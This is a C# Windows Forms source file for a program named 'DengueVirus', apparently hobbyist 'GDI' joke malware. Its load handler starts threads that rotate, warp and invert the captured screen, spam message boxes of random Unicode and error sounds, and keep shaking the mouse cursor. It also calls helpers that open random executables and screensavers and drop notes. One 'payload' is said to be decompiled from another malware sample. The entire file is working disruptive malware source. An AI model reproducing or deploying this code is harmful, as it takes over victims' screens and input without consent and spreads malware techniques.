using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DengueVirus.Spicy;

namespace DengueVirus
{
    public partial class Form1 : Form
    {
        // DLLs import thing, ignore it i guess.

        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, int rop);

        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int x, int y, int width, int height, uint rop);

        const int SRCCOPY = 0xCC0020; // idk why i put this here, too lazy to replace the var with the hex

        public Form1()
        {
            InitializeComponent();
        }

        public static void ErrorSounds()
        {
            while (true)
            {
                switch (new Random().Next(2))
                {
                    case 1:
                        SystemSounds.Hand.Play();
                        break;
                    case 0:
                        SystemSounds.Exclamation.Play();
                        break;
                }
                Thread.Sleep(400);
            }
        }

        public static void ShakeMouse()
        {
            // get cursor
            Cursor c = new Cursor(Cursor.Current.Handle);

            for (; ; )
            {
                // change its xy pos
                int i;
                for (i = 0; i < 100; i++)
                {
                    Cursor.Position = new Point(
                        Cursor.Position.X + i,
                        Cursor.Position.Y + i
                    );

                    Thread.Sleep(100 - i);

                    Cursor.Position = new Point(
                        Cursor.Position.X + i,
                        Cursor.Position.Y - i
                    );

                    Thread.Sleep(100 - i);

                    Cursor.Position = new Point(
                        Cursor.Position.X - i,
                        Cursor.Position.Y - i
                    );

                    Thread.Sleep(100 - i);

                    Cursor.Position = new Point(
                        Cursor.Position.X - i,
                        Cursor.Position.Y + i
                    );

                    Thread.Sleep(100 - i);
                }
                // reset i var and run again
                i = 0;
            }

        }
        public static void PrintRotate()
        {
            int num = 0;
            while (true)
            {
                IntPtr dc = GetDC(IntPtr.Zero);
                Bitmap image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                Graphics graphics = Graphics.FromImage(image);
                graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                graphics = Graphics.FromHdc(dc);
                if (num < 9)
                {
                    graphics.RotateTransform((float)(num * 4));//(float)(num * 10));
                    //graphics.DrawBezier(new Pen(Color.Red, 2f), 0, 0, 100, 100, 200, 200, 300, 300);
                    graphics.DrawImage(image, 0, 0);
                }
                else
                {
                    graphics.RotateTransform(-90f);
                    num = 0;
                }
                num++;
                Thread.Sleep(1);
            }
        }

        static void Wave()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            Random rand = new Random();

            int v7 = GetSystemMetrics(1);
            int v6 = GetSystemMetrics(0);

            int xD = -100;
            while (true)
            {
                int y = rand.Next(v7);
                int v4 = rand.Next(5);

                if (v4 == 1)
                { BitBlt(hdc, 0, y, v6, xD, hdc, xD, y, SRCCOPY); }
                else
                { BitBlt(hdc, 1, y, v6, xD, hdc, xD, y, SRCCOPY); }
                if (xD < 100) { xD++; } else { xD = -100; }
                Thread.Sleep(1);
            }
        }

        static void PatBltpayload()
        {
            // Stolen from Solaris, kinda generic payload
            // its just an invertscreen pl so i guess its fine
            // to reuse, and it generates some cool artifacts along with
            // the moving screen payload (Wave())

            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                Random rand = new Random();
                int v4 = rand.Next();
                IntPtr v5 = new IntPtr(v4 % 40); // Strings are strange since it was decompiled, not the original source code
                SelectObject(hdc, v5);
                PatBlt(hdc, 0, 0, w, h, 0x005A0049);
                //Thread.Sleep(10);
            }
        }
        const uint MB_ABORTRETRYIGNORE = 0x00000002;
        const uint MB_ICONWARNING = 0x00000030;
        const uint MB_RETRYCANCEL = 0x00000005;
        const uint MB_ICONERROR = 0x00000010;

        static void MessageBoxThread()
        {
            for (; ; )
            {
                string strText = GenRandomUnicodeString(new Random().Next(10, 20));
                string strTitle = GenRandomUnicodeString(new Random().Next(10, 20));
                Random random = new Random();

                if (random.Next(0, 2) == 0)
                {
                    MessageBox.Show(strText, strTitle, (MessageBoxButtons)MB_ABORTRETRYIGNORE, (MessageBoxIcon)MB_ICONWARNING);
                }
                else
                {
                    MessageBox.Show(strText, strTitle, (MessageBoxButtons)MB_RETRYCANCEL, (MessageBoxIcon)MB_ICONERROR);
                }
            }
        }

        static string GenRandomUnicodeString(int length)
        {
            Random random = new Random();
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < length; i++)
            {
                // make it use all unicode characters inst4ead of only cyrillic
                builder.Append((char)random.Next(0x0000, 0xFFFF)); // Cyrillic characters as an example
            }
            return builder.ToString();
        }

        public void DrawTextScreen()
        {
            Graphics g = this.CreateGraphics();
            Font f = new Font("Impact", 10);
            SolidBrush b = new SolidBrush(Color.Red);
            g.DrawString(GenRandomUnicodeString(10), f, b, 10, 10);
        }

        public void ChangeButtonSize()
        {
            while (true)
            {
                button1.Size = new Size(button1.Size.Width + new Random().Next(-1, 2), button1.Size.Height + new Random().Next(-1, 2));
                button1.Text = GenRandomUnicodeString(button1.Size.Width);
                Thread.Sleep(10);
            }
        }

        public void Form1_Load(object sender, EventArgs e)
        {
            //if the date is 1st of any month
            if (DateTime.Now.Day == 1)
            {
                Cursor = Cursors.WaitCursor;
                Thread.Sleep(1000);
                Cursor = Cursors.Default;
                Thread.Sleep(1000);
                Cursor = Cursors.WaitCursor;
                Thread.Sleep(1000);
                Cursor = Cursors.AppStarting;
                Thread.Sleep(1000);
                Cursor = Cursors.Default;
            }

            SpicyPL.OpenRandomEXE();
            
            SpicyPL.WriteNote();

            Thread.Sleep(12000);

            Thread t3 = new Thread(PrintRotate); t3.Start();
            Thread t4 = new Thread(Wave); t4.Start();

            Thread.Sleep(5000);
            Thread t5 = new Thread(PatBltpayload); t5.Start();
            t3.Abort();
            Thread t6 = new Thread(MessageBoxThread); t6.Start();

            SpicyPL.UserNote();

            Thread.Sleep(5000);
            t5.Abort();
            t6.Abort();
            SpicyPL.OpenRandomScreensaver();

            Thread.Sleep(5000);
            t4.Abort();
            SpicyPL.OpenRandomEXE();

            Thread aaa = new Thread(ChangeButtonSize); aaa.Start();

            //close form
            //this.Close();

        }

        private void button1_Click(object sender, EventArgs e)
        {
            Thread XD = new Thread(PrintRotate); XD.Start();
            Thread.Sleep(5000);
            XD.Abort();
        }
    }
}
